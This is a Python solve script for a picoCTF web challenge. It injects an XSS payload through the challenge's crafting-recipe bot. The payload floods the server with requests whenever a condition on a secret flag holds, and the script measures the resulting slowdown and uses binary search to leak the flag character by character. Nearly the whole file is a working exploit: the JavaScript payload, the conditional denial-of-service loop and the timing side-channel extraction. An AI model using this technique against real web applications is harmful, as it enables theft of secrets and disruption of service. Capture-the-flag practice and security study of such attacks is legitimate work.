#!/usr/bin/env python3
from collections import namedtuple
import datetime
from functools import partial
import json
import requests
from statistics import mean, median, stdev
import time
from typing import Callable


TimingResults = namedtuple("TimingResults", ["mean", "median", "stdev"])


chain = [['Earth', 'Water'], ['Earth', 'Fire'], ['Air', 'Earth'], ['Air', 'Water'], ['Magma', 'Mist'], ['Magma', 'Mud'],
         ['Fire', 'Mud'], ['Fire', 'Mist'], ['Obsidian', 'Water'], ['Air', 'Rock'], ['Fog', 'Mud'],
         ['Hot Spring', 'Sludge'], ['Fire', 'Steam Engine'], ['Brick', 'Mud'], ['Hot Spring', 'Steam Engine'],
         ['Earth', 'Obsidian'], ['Brick', 'Fog'], ['Computer Chip', 'Steam Engine'], ['Dust', 'Heat Engine'],
         ['Adobe', 'Cloud'], ['Electricity', 'Software'], ['Computer Chip', 'Fire'],
         ['Artificial Intelligence', 'Data'], ['Encryption', 'Software'], ['Fire', 'Sand'], ['Internet', 'Program'],
         ['Glass', 'Software'], ['Cybersecurity', 'Vulnerability'], ['Exploit', 'Web Design']]


def build_state(xss: str) -> dict:
    """Build a state that has a satisfactory recipe and a given XSS payload"""
    assert len(xss) < 300, "XSS payload is too long"
    return {
        "recipe": chain,
        "xss": xss,
    }


xss_payload_template = """
let t=()=>{
    let s=document.createElement("script");
    s.src=`/remoteCraft?recipe=${new Date/1}`;
    s.async=!0;
    s.onerror=t;
    document.head.appendChild(s);
};
const d = () => {
    for (let i=0;i< 30;i++) {
        t()
    }
};
CONDITIONAL&&d()
""".strip()

xss_payload_template = "".join(line.lstrip() for line in xss_payload_template.split("\n"))


def binary_search(func: Callable[[int], bool],
                  lo: int,
                  hi: int):
    """
    Find a target value in the range [lo, hi) - that is, inclusive
    on the lower end and exclusive on the upper end.

    This is done using a callable that takes an integer and returns
    True if the given integer value is >= the target value

    >>> binary_search(lambda guess: guess >= 0, 0, 1024)
    0
    >>> binary_search(lambda guess: guess >= 1, 0, 1024)
    1
    >>> binary_search(lambda guess: guess >= 2, 0, 1024)
    2
    >>> binary_search(lambda guess: guess >= 42, 0, 1024)
    42
    >>> binary_search(lambda guess: guess >= 43, 0, 1024)
    43
    >>> binary_search(lambda guess: guess >= 1022, 0, 1024)
    1022
    >>> binary_search(lambda guess: guess >= 1023, 0, 1024)
    1023
    """
    while lo < hi:
        # Midpoint is the floor of the midpoint between lo and hi
        mid = (lo + hi) // 2
        if func(mid):
            # Target is in the lower half. Move hi down.
            hi = mid
        else:
            # Target is in the upper half. Move lo up.
            lo = mid + 1
    assert lo == hi
    return lo


class Bot:
    s: requests.Session
    baseurl: str
    baseline_mean_timing: float

    def __init__(self, baseurl: str):
        self.s = requests.session()
        self.baseurl = baseurl

        print("[+] Measuring baseline timing")
        self.baseline_mean_timing = self.measure_responsiveness(datetime.timedelta(seconds=10)).mean

    def trigger(self, xss: str):
        r = self.s.get(url=self.baseurl.rstrip("/") + "/remoteCraft",
                       params={
                           "recipe": json.dumps(build_state(xss))
                       })
        r.raise_for_status()
        if r.text != "visiting!":
            raise Exception(f"Unexpected response from bot: {r.text}")

    def trigger_conditional_dos(self, conditional: str):
        """
        Direct the bot to DoS the webapp if the JavaScript expression
        given by conditional is true
        """
        self.trigger(xss=xss_payload_template.replace("CONDITIONAL", conditional))

    def measure_responsiveness(self, time_period: datetime.timedelta) -> TimingResults:
        """
        Spend time_period collecting response times for self.url
        then return the mean, median and standard deviation
        """
        measurements_start = datetime.datetime.now()
        times = []
        while datetime.datetime.now() < measurements_start + time_period:
            measurement_start = time.perf_counter()
            self.s.get(url=self.baseurl)
            took = time.perf_counter() - measurement_start
            times.append(took)
        return TimingResults(mean(times), median(times), stdev(times))

    def leak_bit(self, condition: str) -> bool:
        """
        Determine the truthiness of condition using conditional load and
        timing measurement trick
        """
        # Kick off the conditional flood
        self.trigger_conditional_dos(condition)
        # Wait for the remote browser to start
        time.sleep(2)
        # Measure timing
        res = self.measure_responsiveness(datetime.timedelta(seconds=5)).mean
        # Wait for the remote browser to definitely be killed
        time.sleep(5)
        # Return True if the observed timing is more than 1.4x the baseline timing
        return res > 1.4 * self.baseline_mean_timing

    def leak_flag(self, known_flag_prefix: str = ""):
        """Leak the value of state.flag using binary search"""
        print("[+] Getting the length of flag")
        def check_length(guess: int) -> bool:
            return self.leak_bit(f"{guess}>=state.flag.length")
        # Assume the flag is less than 1024 bytes long
        # If it's any longer, there is a special place in hell for the author
        flag_length = binary_search(check_length, 0, 1024)
        print(f"Got: {flag_length}")
        print()

        print("[+] Leaking the flag, here we go!")
        flag = list(known_flag_prefix)
        def check_ith_flag_char(guess: int, i: int) -> bool:
            return self.leak_bit(f"{guess}>=state.flag.charCodeAt({i})")
        for i in range(len(flag), flag_length):
            # Wrap the i'th flag char checker function to set i
            # because binary_search expects a callable that takes a single int
            partial_func = partial(check_ith_flag_char, i=i)
            # Leak the char
            c = chr(binary_search(partial_func, 0, 0x80))
            flag.append(c)
            # Print the progress
            print("".join(flag) + "_" * (flag_length - len(flag)))
        return "".join(flag)


def main():
    bot = Bot(baseurl="http://rhea.picoctf.net:57736/")
    flag = bot.leak_flag()
    print(f"Got flag: {flag}")


if __name__ == "__main__":
    main()
